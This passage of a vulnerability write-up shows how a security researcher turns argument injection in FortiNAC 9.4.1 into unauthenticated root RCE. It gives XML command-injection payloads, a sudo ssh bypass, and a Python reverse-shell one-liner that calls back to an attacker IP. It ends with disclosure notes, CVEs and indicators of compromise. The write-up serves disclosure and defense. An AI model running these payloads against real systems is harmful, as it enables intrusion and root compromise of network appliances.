+</arg>
+</commandName>
+```
+
+This `commandName` indeed contains `installAgentPackage`, an allowed command. This will indeed execute as expected, **giving us unauthenticated RCE**, at least from a proof-of-concept point of view. But what we really want is a reverse shell or so. This time, we borrow a [well-known trick to get a full shell environment](https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html) in `Runtime.getRuntime().exec` calls. A new `text.xml`, please.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<commandName>bash -c $@|bash installAgentPackage echo touch /tmp/RCE
+<arg>
+</arg>
+</commandName>
+```
+
+Deliver and....nothing, no new file `/tmp/RCE` created. Luckily, extended logging is enabled by default at FortiNACs and found in e.g. `/bsc/logs/output.processManager`.
+
+```log
+yams.CampusManager INFO :: 2023-03-26 10:53:09:958 :: #386 :: commandName = bash -c $@|bash installAgentPackage echo touch /tmp/RCE
+buffer = 
+time = 0
+retval = false
+
+yams.CampusManager INFO :: 2023-03-26 10:53:09:958 :: #386 :: isAllowedCommand(bash -c $@|bash installAgentPackage echo touch /tmp/RCE) true
+yams.CampusManager INFO :: 2023-03-26 10:53:09:958 :: #15 :: Running command = bash -c $@|bash installAgentPackage echo touch /tmp/RCE 
+yams.CampusManager INFO :: 2023-03-26 10:53:10:959 :: #15 :: Sorry, user nac is not allowed to execute '/bin/bash -c $@|bash installAgentPackage echo touch /tmp/RCE' as root on localhost.localdomain.
+```
+
+`isAllowedCommand(bash -c $@|bash installAgentPackage echo touch /tmp/RCE) true` sounds good but this is new to us: `Sorry, user nac is not allowed to execute '/bin/bash -c $@|bash installAgentPackage echo touch /tmp/RCE' as root on localhost.localdomain.`
+
+### Sudo Restriction Bypass
+
+Being able to execute commands with `sudo` usually is a nice gift for attackers but you can also restrict a lot of things to make someones life a bit harder. For the user `nac` an extra "sudoers" file exists at `/etc/sudoers.d/nac`. This file contains a lot of stuff but I'll only present the relevant pieces again.
+
+```bash
+...
+User_Alias NAC_MGMT = tomcat, nac
+...
+Cmnd_Alias NAC_MGMT_COMMANDS = \
+                         /bin/cp, \
+                         /usr/bin/nmap, \
+                         /usr/bin/scp, \
+                         /usr/bin/ssh, \
+                         /usr/bin/openssl, \
+                         /bin/ln, \
+                         /bin/hostname, \
+						 ...
+```
+
+The `nac` user has **a lot of commands** available to be executed with root privileges. I didn't even know which one to choose first :-P.
+
+But starting from the very beginning of the list, I hit the `ssh` command within seconds. SSH to localhost with appending an arbitrary command should be as easy as this `test.xml`.
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<commandName>ssh -E installAgentPackage root@localhost
+<arg>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.137.0.16",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+</arg>
+</commandName>
+```
+
+And here we are, getting our **reverse shell as root** user. **Unauthenticated RCE in round 2**.
+
+![fortinacRCE2.png](/assets/images/fortinac/fortinacRCE2.png)
+
+## Conclusions
+
+During my disclosure process starting in *early March 2023*, I was informed that the SSH primitive in my last RCE chain was fixed independently by Fortinet's team [in version 9.4.2](https://www.fortiguard.com/psirt/FG-IR-22-309), i.e. days after my submission. Since I worked on a **9.4.1 version with a patch for CVE-2022-39952 only**, I wasn't aware of this at this time. Also I (still) don't have access to 9.4.2 (or newer) virtual machine images such that I couldn't test for additional bypasses (bet there are others). Nevertheless, for a fully patched 9.4.1 the second RCE chain was still valid and working, as are all my other findings. For 9.4.2 feel free to look for other bypasses to escalate my still valid **argument injection** to RCE again. Fortinet provided patches for all my other vulnerabilities although I couldn't confirm their effectiveness. *Tl;dr:* all my exploits turned out to be fully functional and valid against **9.4.1**. For **9.4.2**, [FG-IR-22-304](https://www.fortiguard.com/psirt/FG-IR-22-304) seemed to have been mitigated my XXE vector, [FG-IR-22-309](https://www.fortiguard.com/psirt/FG-IR-22-309) my `sudo ssh` chain part of the second RCE. **The relevant patch release 9.4.3 was already released in the beginning of April 2023 but still no security advisories, yet.** This is why I informed the Fortinet PSIRT about this blog post's release time in advance and they also acknowledged my plans to do so. The following CVEs were assigned by Fortinet.
+
+* CVE-2023-33299 (Untrusted Deserialization)
+* CVE-2023-33300 (Command Injection)
+
+## Internet Exposure Check
+
+Fortunately, not a lot of companies expose TCP ports 1050 or 5555 to the public Internet. Similar to my [UN post](https://frycos.github.io/vulns4free/2023/01/24/0days-united-nations.html), one interesting candidate stood out at the very top of our Censys search. A machine being part of the *Chemonics International, Inc.* company network  indeed gave access to these services. This is a well-known company closely [working with the U.S. government](https://www.usaspending.gov/award/CONT_AWD_AIDOAATO1500007_7200_AIDOAAI1500004_7200) so I used the official [CISA reporting site](https://www.cisa.gov/report) to forward this information to the Department of Homeland Security (DHS). A few days later the vulnerables services were found to be gone. This product is still a valuable target in Intranet assessments, though. Happy Pwning!
+
+![censys.png](/assets/images/fortinac/censys.png)
+
+## Indicators of Compromise (IoCs)
+
+Exploitation attempts could be detected by looking at the appropiate application log file.
+
+* **Insecure deserialization on TCP port 1050:** any stack trace in `/bsc/logs/output.master` containing `ObjectInputStream.readObject()` should be rated as suspicious.
+
+* **Command injection on TCP port 5555:** any occurence of `isAllowedCommand\(.+\) false`  in `/bsc/logs/output.processManager` should be rated as exploitation attempt.
